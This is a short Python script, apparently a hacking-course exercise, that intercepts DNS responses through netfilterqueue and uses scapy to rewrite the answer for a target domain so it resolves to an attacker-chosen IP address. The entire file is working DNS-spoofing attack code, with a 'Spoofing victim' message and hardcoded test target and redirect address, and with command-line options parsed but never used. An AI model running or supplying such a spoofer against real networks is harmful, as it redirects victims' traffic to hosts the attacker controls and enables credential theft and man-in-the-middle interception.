#!/usr/bin/python3
import netfilterqueue
import scapy.all as scapy
import optparse

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-i","--ip", dest="ip", help="Please enter an ip you would like to redirect traffic to.")
    parser.add_option("-d", "--domain", dest="domain", help="Please enter a domain you would like to spoof")
    (options, arguments) = parser.parse_args()
    if not options.ip:
        parser.error("[-] Please enter an ip address, use --help for more information")
    elif not options.domain:
        parser.error("[-] Please enter a domain name, use --help for more information")
    else:
        return options


def process_packet(packet):
    ip = "192.168.0.13"
    domain = "testphp.vulnweb.com"
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        print(scapy_packet.show())
        qname = scapy_packet[scapy.DNSQR].qname
        if domain in qname:
            print("[+] Spoofing victim...")
            answer = scapy.DNSRR(rrname=qname, rdata=ip)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(str(scapy_packet))
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
